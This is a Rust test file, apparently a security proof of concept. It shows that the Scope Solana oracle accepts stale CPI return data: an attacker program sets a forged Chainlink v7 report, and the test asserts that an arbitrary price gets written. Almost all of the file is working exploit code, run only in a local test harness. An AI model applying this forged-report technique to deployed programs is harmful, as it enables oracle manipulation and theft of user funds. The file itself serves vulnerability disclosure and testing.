#![cfg(test)]

use anchor_lang::{prelude::*, InstructionData, ToAccountMetas};
use chainlink_streams_report::{
	feed_id::ID as FeedID,
	report::v7::ReportDataV7,
};
use num_bigint::BigInt;
use solana_program::{instruction::Instruction, program_pack::Pack, system_instruction};
use solana_program_test::{processor, ProgramTest};
use solana_sdk::{
	account::Account,
	signature::{Keypair, Signer},
	sysvar,
	transaction::Transaction,
};

#[tokio::test]
async fn poc_stale_return_data_sets_arbitrary_chainlink_price_v7() {
	// Add Scope (Anchor), Attacker (set_return_data), and Verifier (no return data)
	let mut pt = ProgramTest::new("scope", scope::id(), processor!(scope::entry));
	// Register verifier under the expected program id constant used by Scope
	pt.add_program("verifier", scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_PROGRAM_ID, processor!(verifier::process_instruction));
	// Register attacker with a random program id
	let attacker_program_id = Pubkey::new_unique();
	pt.add_program("attacker", attacker_program_id, processor!(attacker::process_instruction));

	// Pre-create read-only accounts required by the handler with fixed addresses
	let verifier_cfg = scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_CONFIG_PUBKEY;
	let access_controller = scope::oracles::chainlink::chainlink_streams_itf::ACCESS_CONTROLLER_PUBKEY;
	pt.add_account(
		verifier_cfg,
		Account { lamports: 1_000_000, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
	);
	pt.add_account(
		access_controller,
		Account { lamports: 1_000_000, data: vec![], owner: system_program::id(), executable: false, rent_epoch: 0 },
	);

	let (mut banks_client, payer, recent_blockhash) = pt.start().await;

	// Create zero-copy accounts owned by Scope
	let oracle_mappings = Keypair::new();
	let oracle_prices = Keypair::new();
	let oracle_twaps = Keypair::new();
	let token_metadatas = Keypair::new();

	let create_accounts_ixs = vec![
		system_instruction::create_account(
			&payer.pubkey(),
			&oracle_mappings.pubkey(),
			5_000_000,
			(8 + scope::utils::consts::ORACLE_MAPPING_SIZE) as u64,
			&scope::id(),
		),
		system_instruction::create_account(
			&payer.pubkey(),
			&oracle_prices.pubkey(),
			5_000_000,
			(8 + scope::utils::consts::ORACLE_PRICES_SIZE) as u64,
			&scope::id(),
		),
		system_instruction::create_account(
			&payer.pubkey(),
			&oracle_twaps.pubkey(),
			5_000_000,
			(8 + scope::utils::consts::ORACLE_TWAPS_SIZE) as u64,
			&scope::id(),
		),
		system_instruction::create_account(
			&payer.pubkey(),
			&token_metadatas.pubkey(),
			5_000_000,
			(8 + scope::utils::consts::TOKEN_METADATA_SIZE) as u64,
			&scope::id(),
		),
	];

	let mut tx = Transaction::new_with_payer(&create_accounts_ixs, Some(&payer.pubkey()));
	tx.sign(&[&payer, &oracle_mappings, &oracle_prices, &oracle_twaps, &token_metadatas], recent_blockhash);
	banks_client.process_transaction(tx).await.unwrap();

	// Initialize scope
	let feed_name = "test-feed".to_string();
	let (config_pda, _bump) = scope::utils::pdas::config_pubkey(&feed_name);
	let init_accounts = scope::accounts::Initialize {
		admin: payer.pubkey(),
		system_program: system_program::id(),
		configuration: config_pda,
		token_metadatas: token_metadatas.pubkey(),
		oracle_twaps: oracle_twaps.pubkey(),
		oracle_prices: oracle_prices.pubkey(),
		oracle_mappings: oracle_mappings.pubkey(),
	};
	let init_ix = Instruction {
		program_id: scope::id(),
		accounts: init_accounts.to_account_metas(None),
		data: scope::instruction::Initialize { feed_name: feed_name.clone() }.data(),
	};
	let mut tx = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
	tx.sign(&[&payer], banks_client.get_latest_blockhash().await.unwrap());
	banks_client.process_transaction(tx).await.unwrap();

	// Set mapping for token 0 to ChainlinkExchangeRate (v7)
	let token_index: u16 = 0;
	let price_type_v7: u8 = scope::oracles::OracleType::ChainlinkExchangeRate.into();
	let twap_enabled = false;
	let twap_source: u16 = 0;
	let ref_price_index: u16 = u16::MAX; // disable ref check for clarity
	let feed_mapping = Pubkey::new_unique();
	let mut generic_data = [0u8; 20];
	// not used in v7

	let update_accounts = scope::accounts::UpdateOracleMapping {
		admin: payer.pubkey(),
		configuration: config_pda,
		oracle_mappings: oracle_mappings.pubkey(),
		price_info: Some(feed_mapping),
	};
	let update_ix = Instruction {
		program_id: scope::id(),
		accounts: update_accounts.to_account_metas(None),
		data: scope::instruction::UpdateMapping {
			token_id: token_index,
			price_type: price_type_v7,
			twap_enabled,
			twap_source,
			ref_price_index,
			feed_name: feed_name.clone(),
			generic_data,
		}.data(),
	};
	let mut tx = Transaction::new_with_payer(&[update_ix], Some(&payer.pubkey()));
	tx.sign(&[&payer], banks_client.get_latest_blockhash().await.unwrap());
	banks_client.process_transaction(tx).await.unwrap();

	// Build a forged Chainlink ReportDataV7 that decodes and sets an arbitrary price
	let feed_id = FeedID(feed_mapping.to_bytes());
	let observations_timestamp: u64 = 1; // > initial 0
	let exchange_rate_decimals_18 = BigInt::from(5_000_000_000_000_000_000u128); // 5 * 1e18
	let report = ReportDataV7 {
		feed_id,
		observations_timestamp: observations_timestamp.into(),
		exchange_rate: exchange_rate_decimals_18,
	};
	let forged_bytes = report.encode();

	// Instruction 0: attacker sets return data to forged report bytes
	let attacker_ix = Instruction {
		program_id: attacker_program_id,
		accounts: vec![],
		data: forged_bytes.clone(),
	};

	// Build refresh_chainlink_price accounts
	let refresh_accounts = scope::accounts::RefreshChainlinkPrice {
		user: payer.pubkey(),
		oracle_prices: oracle_prices.pubkey(),
		oracle_mappings: oracle_mappings.pubkey(),
		oracle_twaps: oracle_twaps.pubkey(),
		verifier_account: verifier_cfg,
		access_controller,
		config_account: Pubkey::new_unique(),
		verifier_program_id: scope::oracles::chainlink::chainlink_streams_itf::VERIFIER_PROGRAM_ID,
	};

	// Provide any bytes to satisfy CPI path; verifier ignores and returns Ok without setting return data
	let serialized_chainlink_report = vec![1, 2, 3];
	let refresh_ix = Instruction {
		program_id: scope::id(),
		accounts: refresh_accounts.to_account_metas(None),
		data: scope::instruction::RefreshChainlinkPrice {
			token: token_index,
			serialized_chainlink_report: serialized_chainlink_report.clone(),
		}.data(),
	};

	let mut tx = Transaction::new_with_payer(&[attacker_ix, refresh_ix], Some(&payer.pubkey()));
	tx.sign(&[&payer], banks_client.get_latest_blockhash().await.unwrap());
	let res = banks_client.process_transaction(tx).await;
	assert!(res.is_ok(), "transaction failed: {res:?}");

	// Read back OraclePrices and print the manipulated value
	let prices_acc = banks_client
		.get_account(oracle_prices.pubkey())
		.await
		.unwrap()
		.expect("oracle_prices missing");
	let mut data: &[u8] = &prices_acc.data;
	// Skip 8-byte discriminator
	data = &data[8..];
	// DatedPrice[0] layout: Price { value: u64, exp: u64 }, last_updated_slot u64, unix_timestamp u64, generic_data [u8;24]
	let value = u64::from_le_bytes(data[0..8].try_into().unwrap());
	let exp = u64::from_le_bytes(data[8..16].try_into().unwrap());
	println!("[poc] manipulated price value={}, exp={}", value, exp);
	assert!(value > 0, "price was not updated by forged report");
}

